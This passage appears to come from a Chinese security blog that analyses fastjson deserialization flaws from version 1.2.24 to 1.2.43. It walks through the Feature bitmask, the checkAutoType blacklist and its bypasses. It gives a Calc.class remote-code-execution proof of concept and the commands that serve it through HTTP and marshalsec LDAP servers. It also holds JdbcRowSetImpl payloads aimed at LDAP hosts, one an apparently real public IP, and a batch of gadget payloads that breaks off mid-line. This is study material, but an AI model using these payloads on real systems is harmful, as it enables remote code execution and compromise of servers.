<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fieldDeserializer &#x3D;&#x3D; null &amp;&amp; </span><br><span class="line">(  </span><br><span class="line">   parser.lexer.isEnabled(mask)  || </span><br><span class="line">   (this.beanInfo.parserFeatures &amp; mask) !&#x3D; 0)</span><br><span class="line">) </span><br></pre></td></tr></table></figure>

<p>细看<code>parser.lexer.isEnabled(mask) </code>方法，在没有设置<code>Feature.SupportNonPublicField</code>时，this,features的值为989, 函数传入的feature参数为131072,通过<code>&amp;</code>进行与运算时，值为0。在设置了<code>Feature.SupportNonPublicField</code>后，this,features的值为变成了132061, 函数传入的feature参数依然为131072,过<code>&amp;</code>进行与运算时，值为00000000000000100000000000000000，十进制就是131072。</p>
<p><img src="image-20240313162545678.png" alt="image-20240313162545678"></p>
<p><img src="image-20240313171200225.png" alt="image-20240313171200225"></p>
<p><img src="image-20240313171329070.png" alt="image-20240313171329070"></p>
<p>由此可以得知，当代码进行到这个if判断是，它会用<code>final int mask = Feature.SupportNonPublicField.mask;</code>的mask和JSONLexerBase类的<code>this.features</code>进行与运算。由于在<code>JSON.parse(p1,Feature.SupportNonPublicField);</code>中加入了Feature.SupportNonPublicField，所以会导致两次的<code>this.features</code>的值不一样，进而导致<code>parser.lexer.isEnabled(mask) </code>结果不一样。</p>
<p>细看一下这个枚举类型 <code>Feature</code>。代码如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 1999-2101 Alibaba Group.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.parser;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wenshao[szujobs@hotmail.com]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Feature</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AutoCloseSource,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AllowComment,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AllowUnQuotedFieldNames,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AllowSingleQuotes,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    InternFieldNames,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AllowISO8601DateFormat,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &#123;&quot;a&quot;:1,,,&quot;b&quot;:2&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AllowArbitraryCommas,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    UseBigDecimal,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.2</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    IgnoreNotMatch,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.3</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SortFeidFastMatch,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.3</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DisableASM,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.7</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DisableCircularReferenceDetect,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.10</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    InitStringFieldAsEmpty,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.1.35</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SupportArrayToBean,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2.3</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    OrderedField,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2.5</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DisableSpecialKeyDetect,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2.9</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    UseObjectArray,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2.22, 1.1.54.android</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SupportNonPublicField</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    Feature()&#123;</span><br><span class="line">        mask = (<span class="number">1</span> &lt;&lt; ordinal());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> mask;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getMask</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEnabled</span><span class="params">(<span class="keyword">int</span> features, Feature feature)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (features &amp; feature.mask) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">config</span><span class="params">(<span class="keyword">int</span> features, Feature feature, <span class="keyword">boolean</span> state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (state) &#123;</span><br><span class="line">            features |= feature.mask;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            features &amp;= ~feature.mask;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> features;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">of</span><span class="params">(Feature[] features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (features == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Feature feature: features) &#123;</span><br><span class="line">            value |= feature.mask;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个枚举类定义了</p>
<ol start="0">
<li><p>AutoCloseSource,</p>
</li>
<li><p>AllowComment,</p>
</li>
<li><p>AllowUnQuotedFieldNames,</p>
</li>
<li><p>AllowSingleQuotes,</p>
</li>
<li><p>InternFieldNames,</p>
</li>
<li><p>AllowISO8601DateFormat,</p>
</li>
<li><p>AllowArbitraryCommas,</p>
</li>
<li><p>UseBigDecimal,</p>
</li>
<li><p>IgnoreNotMatch,</p>
</li>
<li><p>SortFeidFastMatch,</p>
</li>
<li><p>DisableASM,</p>
</li>
<li><p>DisableCircularReferenceDetect,</p>
</li>
<li><p>InitStringFieldAsEmpty,</p>
</li>
<li><p>SupportArrayToBean,</p>
</li>
<li><p>OrderedField,</p>
</li>
<li><p>DisableSpecialKeyDetect,</p>
</li>
<li><p>UseObjectArray,</p>
</li>
<li><p>SupportNonPublicField</p>
</li>
</ol>
<p>一共18个变量，通过<code>mask = (1 &lt;&lt; ordinal());</code>移位进行赋值，比如AutoCloseSource的值其实是2^0=1，AllowComment的值其实是2^1=2,10(2)，而UseBigDecimal的值其实是2^7=127，10000000(2)，最后的SupportNonPublicField则是2^17=131072，100000000000000000(2)。一个参数代表一个二进制位，这样如果设置了多个值，就只需要把他们加起来就好了。</p>
<p>比如在fastjson初始化时,会有一个设置初始DEFAULT_PARSER_FEATURE的过程，最后初始化出来的DEFAULT_PARSER_FEATURE结果就是989，1111011101(2)，下面还有DEFAULT_GENERATE_FEATURE的初始化。也是一样的。</p>
<p><img src="image-20240314094109496.png" alt="image-20240314094109496"></p>
<p>正常情况下使用JSON.parse(p1);初始化features用的就是DEFAULT_PARSER_FEATURE（989）。这就会导致在<code>parser.lexer.isEnabled(mask) </code>时，返回false。</p>
<p><img src="image-20240314094600980.png" alt="image-20240314094600980"></p>
<p>而在使用<code>JSON.parse(p1,Feature.SupportNonPublicField);</code>时，parse会进入parse(String text, Feature… features)中，将设置的feature值和DEFAULT_PARSER_FEATURE相加后再进入到parse(String text, int features)中。</p>
<p><img src="image-20240314095258508.png" alt="image-20240314095258508"></p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>环境</p>
<ul>
<li>ubuntu 22.04</li>
<li>java version “1.8.0_102”</li>
<li>marshalsec-0.0.3-SNAPSHOT-all.jar （sha1 22f311752a1c6ce1102bcb199458c8d10118ae6e）</li>
</ul>
<p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;;<span class="comment">//win的目标可以换成calc</span></span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javac Calc.java生成Calc.class后，使用python起一个web服务。</p>
<ul>
<li>sudo python3 -m http.server 8888</li>
</ul>
<p>然后使用marshalsec-0.0.3-SNAPSHOT-all.jar起一个LDAP服务</p>
<ul>
<li>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link" href="http://0.0.0.0:8888/#Calc&quot;">http://0.0.0.0:8888/#Calc&quot;<i class="fas fa-external-link-alt"></i></a> 9999</li>
</ul>
<p>再然后idea里的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test11</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String cmd = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.56.213:9999/calc\&quot;,  \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    Object P2 = JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240307142526862.png" alt="image-20240307142526862"></p>
<p>流程分析：</p>
<p>在com.sun.rowset.JdbcRowSetImpl类中，有一个setAutoCommit类，完全符合fastjson自动调用的setter方法的条件：长度大于4、非静态、void返回、set后的字母大写、参数为1。需要payload中有”autoCommit&quot;:true。设置为true，是为了让这个函数能执行this.connect()。这个connect()才是执行命令的关键</p>
<p><img src="image-20240307145501023.png" alt="image-20240307145501023"></p>
<p>ctrl+左键进入connect()内，可以看到危险代码(DataSource)var1.lookup(this.getDataSourceName());关键是这个<code>lookup()</code>,目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；</p>
<p><img src="image-20240307150004307.png" alt="image-20240307150004307"></p>
<h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code></p>
<p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>
<p>之前的流程相同，关键点在DefaultJSONParser.java中，原本获取clazz是通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure>

<p>修复之后，获取clazz多了一层checkAutoType，变成了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p>真正获取clazz的代码，在checkAutoType中，在经过一些黑白名单过滤后，autoTypeSupport不为空，才会通过下面的代码获取clazz然后作为返回值返回到DefaultJSONParser.java中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    …………</span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    …………</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240316161153077.png" alt="image-20240316161153077"></p>
<p>之后进入到ParserConfig.java中，在这里面，设置了autoTypeSupport的默认值为false，以及一个denylist黑名单共22条，上一轮用到的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl和com.sun.rowset.JdbcRowSetImpl都被包含其中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在默认情况下，没办法进行反序列化。</p>
<p><img src="image-20240316142549386.png" alt="image-20240316142549386"></p>
<h3 id="开启autotype"><a href="#开启autotype" class="headerlink" title="开启autotype"></a>开启autotype</h3><p>可以使用这两种方法开启autotype</p>
<ol>
<li>JVM启动参数</li>
</ol>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">-Dfastjson.parser.autoTypeSupport</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>代码中设置</li>
</ol>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">ParserConfig<span class="selector-class">.getGlobalInstance</span>()<span class="selector-class">.setAutoTypeSupport</span>(true);</span><br></pre></td></tr></table></figure>

<p><img src="image-20240316143145148.png" alt="image-20240316143145148"></p>
<h3 id="checkAutoType-逻辑"><a href="#checkAutoType-逻辑" class="headerlink" title="checkAutoType() 逻辑"></a>checkAutoType() 逻辑</h3><p>如果开启了autoType或expectClass不为null，先判断类名的开头是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，如果不在白名单，就判断类名的开头是否在黑名单中，如果在就抛出异常。如果黑名单也没有，就跳出这个判断往后走。</p>
<p><img src="image-20240316145411718.png" alt="image-20240316145411718"></p>
<p>而如果没开启autoType，就先判断类名的开头是否在黑名单中，如果在就抛出异常。如果不在则使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载。</p>
<p><img src="image-20240316145357325.png" alt="image-20240316145357325"></p>
<p>在 <code>TypeUtils.loadClass</code> 中，有这样一个判断，如果类名是以”L”开头且以”;”结尾，就把他们去掉，取中间的值。这样，当我们把类名改为Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;时，就可以绕过前面的白名单，然后在后面的 <code>TypeUtils.loadClass</code> 中，它被改为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl。后面就和1.2.24一样了。<strong>所以这个版本的绕过是一个逻辑漏洞</strong>。</p>
<p><img src="image-20240316162202448.png" alt="image-20240316162202448"></p>
<h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code></p>
<p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
<p>这次在checkAutoType()中添加了对”L”和”;”的过滤。先不看这个if判断。假如if为True，然后代码就将”L”和”;”去掉，看到这个的时候，应该就能想到直接写两个”L”和”;”就可以绕过了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240316170909208.png" alt="image-20240316170909208"></p>
<p>现在来看这个比较绕的if判断。优化一下大概长这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">    (</span><br><span class="line">    	(</span><br><span class="line">    		(</span><br><span class="line">    			BASIC ^ className.charAt(<span class="number">0</span>)</span><br><span class="line">    		) * PRIME</span><br><span class="line">    	) </span><br><span class="line">    	^ className.charAt(className.length() - <span class="number">1</span>)</span><br><span class="line">    )  * PRIME == <span class="number">0x9198507b5af98f0L</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>当className是”L”和”;”包裹的情况下，</p>
<p>BASIC ^ className.charAt(0)  的结果是  -3750763034362895511</p>
<p>(BASIC ^ className.charAt(0)) * PRIME  的结果是 -5808516191223665813</p>
<p>((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(className.length() - 1)   的结果是   -5808516191223665840</p>
<p>((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(className.length() - 1) * PRIME     的结果是   655701488918567152</p>
<p>老实说我看不太明白。查了一下这玩意叫 FNV-1a 算法，这段代码是为了使用 FNV-1a 哈希算法计算类名的哈希值，并检查其是否等于预先定义的常量。</p>
<h2 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h2><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.43</code></p>
<p>这个版本主要是修复上一个版本中双写绕过的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240316174121111.png" alt="image-20240316174121111"></p>
<p>由于在1.2.25的绕过中，用到了”L”和”;”，但是在他之前还有一个对”[“的处理，所以那个也可以用在这里。</p>
<p><img src="image-20240316162202448.png" alt="image-20240316162202448"></p>
<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><h3 id="vulfocus环境"><a href="#vulfocus环境" class="headerlink" title="vulfocus环境"></a>vulfocus环境</h3><p>使用的<strong>JNDIExploit-1.4-SNAPSHOT.jar</strong>工具，github项目地址已经删了：<strong><a class="link" href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit<i class="fas fa-external-link-alt"></i></a></strong>。</p>
<p>不过还好本地下了一份，文件md5为：<strong>0fb1809ac6a9436836717ffb207ee0c9</strong></p>
<p>sha1为：<strong>ea7bc0d12704d7ba145ee4318d374c125b2884d1</strong></p>
<p><img src="image-20240630153515154.png" alt="image-20240630153515154"></p>
<p> java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 4x.1xx.1xx.1xx,后面的地址要跟vps的地址，不能是0.0.0.0</p>
<p><img src="image-20240630152826024.png" alt="image-20240630152826024"></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;42.193.178.194:1389&#x2F;Basic&#x2F;TomcatEcho&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240630153549038.png" alt="image-20240630153549038"></p>
<p><img src="image-20240630153606010.png" alt="image-20240630153606010"></p>
<h3 id="一些笔记"><a href="#一些笔记" class="headerlink" title="一些笔记"></a>一些笔记</h3><h4 id="一批payload"><a href="#一批payload" class="headerlink" title="一批payload"></a>一批payload</h4><p>不过老实说没看明白怎么用的，test0-19不知道什么意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;: &quot;ldap:&#x2F;&#x2F;test0.127.0.0.1:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;test1.127.0.0.1:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;test2.127.0.0.1:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;test3.127.0.0.1:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;test4.127.0.0.1:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;test5.127.0.0.1:1389&#x2F;Exploit&quot;&#125;&#125;</span><br><span class="line">&#123;    &quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;test6.127.0.0.1:1389&#x2F;Exploit&quot;,        &quot;autoCommit&quot;: true    &#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap:&#x2F;&#x2F;test7.127.0.0.1:1389&#x2F;Exploit&quot;&#125;&quot;;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;test8.127.0.0.1:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;test9.127.0.0.1:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;test10.127.0.0.1:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;test11.127.0.0.1:1389&#x2F;Exploit&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;test12.127.0.0.1:1389&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;test13.127.0.0.1:1389&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:, 